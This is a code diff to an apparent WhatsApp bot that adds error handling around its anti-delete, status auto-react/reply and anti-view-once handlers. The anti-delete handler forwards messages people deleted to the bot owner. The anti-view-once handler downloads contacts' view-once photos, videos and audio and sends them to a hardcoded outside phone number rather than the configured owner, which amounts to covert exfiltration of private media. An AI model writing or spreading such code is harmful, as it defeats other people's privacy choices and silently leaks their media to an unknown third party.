@@ -232,60 +232,70 @@ async function connectToWA() {
     // ==============================
     conn.ev.on('messages.update', async (updates) => {
         for (const update of updates) {
-            if (update.update.message === null) {
-                // Message was deleted
-                const messageKey = `${update.key.remoteJid}_${update.key.id}`;
-                const storedMessage = messageStore.get(messageKey);
-                
-                if (storedMessage && config.ANTI_DELETE === "true") {
-                    const ownerJid = ownerNumber[0] + '@s.whatsapp.net';
-                    const isGroup = storedMessage.chat.endsWith('@g.us');
+            try {
+                if (update.update.message === null) {
+                    // Message was deleted
+                    const messageKey = `${update.key.remoteJid}_${update.key.id}`;
+                    const storedMessage = messageStore.get(messageKey);
                     
-                    let deletedBy = update.key.participant || storedMessage.sender;
-                    let chatName = storedMessage.chat;
-                    
-                    if (isGroup) {
-                        try {
-                            const groupMetadata = await conn.groupMetadata(storedMessage.chat);
-                            chatName = groupMetadata.subject;
-                        } catch (e) {
-                            chatName = storedMessage.chat;
+                    if (storedMessage && config.ANTI_DELETE === "true") {
+                        const ownerJid = ownerNumber[0] + '@s.whatsapp.net';
+                        const isGroup = storedMessage.chat.endsWith('@g.us');
+                        
+                        // Validate JIDs before sending
+                        if (!update.key.remoteJid || !storedMessage.sender) {
+                            console.log('Invalid JID in anti-delete, skipping...');
+                            continue;
                         }
-                    }
-                    
-                    const senderName = storedMessage.message.pushName || deletedBy.split('@')[0];
-                    const deletedByName = deletedBy.split('@')[0];
-                    
-                    let notificationText = `🗑️ *ANTI-DELETE ALERT*\n\n`;
-                    notificationText += `📍 *Location:* ${isGroup ? 'Group' : 'Private Chat'}\n`;
-                    notificationText += `💬 *Chat:* ${chatName}\n`;
-                    notificationText += `👤 *Sent By:* @${senderName.replace('@', '')}\n`;
-                    notificationText += `🗑️ *Deleted By:* @${deletedByName}\n`;
-                    notificationText += `⏰ *Time:* ${new Date().toLocaleString()}\n`;
-                    notificationText += `\n📨 *Forwarding deleted message...*`;
-                    
-                    // Send notification
-                    await conn.sendMessage(ownerJid, { 
-                        text: notificationText,
-                        mentions: [deletedBy, storedMessage.sender],
-                        contextInfo: globalContextInfo
-                    });
-                    
-                    // Forward the deleted message
-                    try {
-                        await conn.copyNForward(ownerJid, storedMessage.message, false, {
-                            contextInfo: globalContextInfo
-                        });
-                    } catch (e) {
+                        
+                        let deletedBy = update.key.participant || storedMessage.sender;
+                        let chatName = storedMessage.chat;
+                        
+                        if (isGroup) {
+                            try {
+                                const groupMetadata = await conn.groupMetadata(storedMessage.chat);
+                                chatName = groupMetadata.subject;
+                            } catch (e) {
+                                chatName = storedMessage.chat;
+                            }
+                        }
+                        
+                        const senderName = storedMessage.message.pushName || deletedBy.split('@')[0];
+                        const deletedByName = deletedBy.split('@')[0];
+                        
+                        let notificationText = `🗑️ *ANTI-DELETE ALERT*\n\n`;
+                        notificationText += `📍 *Location:* ${isGroup ? 'Group' : 'Private Chat'}\n`;
+                        notificationText += `💬 *Chat:* ${chatName}\n`;
+                        notificationText += `👤 *Sent By:* @${senderName.replace('@', '')}\n`;
+                        notificationText += `🗑️ *Deleted By:* @${deletedByName}\n`;
+                        notificationText += `⏰ *Time:* ${new Date().toLocaleString()}\n`;
+                        notificationText += `\n📨 *Forwarding deleted message...*`;
+                        
+                        // Send notification
                         await conn.sendMessage(ownerJid, { 
-                            text: `❌ Could not forward message content: ${e.message}`,
+                            text: notificationText,
+                            mentions: [deletedBy, storedMessage.sender],
                             contextInfo: globalContextInfo
                         });
+                        
+                        // Forward the deleted message
+                        try {
+                            await conn.copyNForward(ownerJid, storedMessage.message, false, {
+                                contextInfo: globalContextInfo
+                            });
+                        } catch (e) {
+                            await conn.sendMessage(ownerJid, { 
+                                text: `❌ Could not forward message content: ${e.message}`,
+                                contextInfo: globalContextInfo
+                            });
+                        }
+                        
+                        // Clean up
+                        messageStore.delete(messageKey);
                     }
-                    
-                    // Clean up
-                    messageStore.delete(messageKey);
                 }
+            } catch (e) {
+                console.log('Anti-delete error:', e.message);
             }
         }
     });
@@ -312,51 +322,67 @@ async function connectToWA() {
         }
         
         if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true") {
-            const jawadlike = await conn.decodeJid(conn.user.id);
-            const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '💜', '💙', '🌝', '🖤', '💚'];
-            const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
-            await conn.sendMessage(mek.key.remoteJid, {
-                react: {
-                    text: randomEmoji,
-                    key: mek.key,
+            try {
+                const jawadlike = await conn.decodeJid(conn.user.id);
+                const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '💜', '💙', '🌝', '🖤', '💚'];
+                const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
+                if (mek.key.participant) {
+                    await conn.sendMessage(mek.key.remoteJid, {
+                        react: {
+                            text: randomEmoji,
+                            key: mek.key,
+                        }
+                    }, { statusJidList: [mek.key.participant, jawadlike] });
                 }
-            }, { statusJidList: [mek.key.participant, jawadlike] });
+            } catch (e) {
+                console.log('Status react error:', e.message);
+            }
         }
         
         if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true") {
-            const user = mek.key.participant
-            const text = `${config.AUTO_STATUS__MSG}`
-            await conn.sendMessage(user, { text: text, react: { text: '✈️', key: mek.key } }, { quoted: mek })
+            try {
+                const user = mek.key.participant
+                if (user) {
+                    const text = `${config.AUTO_STATUS__MSG || 'Nice status!'}`
+                    await conn.sendMessage(user, { text: text, react: { text: '✈️', key: mek.key } }, { quoted: mek })
+                }
+            } catch (e) {
+                console.log('Status reply error:', e.message);
+            }
         }
         
         let jawadik = mek.message.viewOnceMessageV2
         let jawadik1 = mek.mtype === "viewOnceMessage"
         
         if (jawadik && config.ANTI_VV === "true") {
-            if (jawadik.message.imageMessage) {
-                let cap = jawadik.message.imageMessage.caption;
-                let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.imageMessage);
-                return conn.sendMessage("254700143167@s.whatsapp.net", { 
-                    image: { url: anu }, 
-                    caption: cap,
-                    contextInfo: globalContextInfo 
-                }, { quoted: mek });
-            } 
-            if (jawadik.message.videoMessage) {
-                let cap = jawadik.message.videoMessage.caption;
-                let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.videoMessage);
-                return conn.sendMessage("254700143167@s.whatsapp.net", { 
-                    video: { url: anu }, 
-                    caption: cap,
-                    contextInfo: globalContextInfo 
-                }, { quoted: mek });
-            } 
-            if (jawadik.message.audioMessage) {
-                let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.audioMessage);
-                return conn.sendMessage("254700143167@s.whatsapp.net", { 
-                    audio: { url: anu },
-                    contextInfo: globalContextInfo 
-                }, { quoted: mek });
+            try {
+                if (jawadik.message.imageMessage) {
+                    let cap = jawadik.message.imageMessage.caption || '';
+                    let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.imageMessage);
+                    return conn.sendMessage("254700143167@s.whatsapp.net", { 
+                        image: { url: anu }, 
+                        caption: cap,
+                        contextInfo: globalContextInfo 
+                    }, { quoted: mek });
+                } 
+                if (jawadik.message.videoMessage) {
+                    let cap = jawadik.message.videoMessage.caption || '';
+                    let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.videoMessage);
+                    return conn.sendMessage("254700143167@s.whatsapp.net", { 
+                        video: { url: anu }, 
+                        caption: cap,
+                        contextInfo: globalContextInfo 
+                    }, { quoted: mek });
+                } 
+                if (jawadik.message.audioMessage) {
+                    let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.audioMessage);
+                    return conn.sendMessage("254700143167@s.whatsapp.net", { 
+                        audio: { url: anu },
+                        contextInfo: globalContextInfo 
+                    }, { quoted: mek });
+                }
+            } catch (e) {
+                console.log('Anti-VV error:', e.message);
             }
         }
         
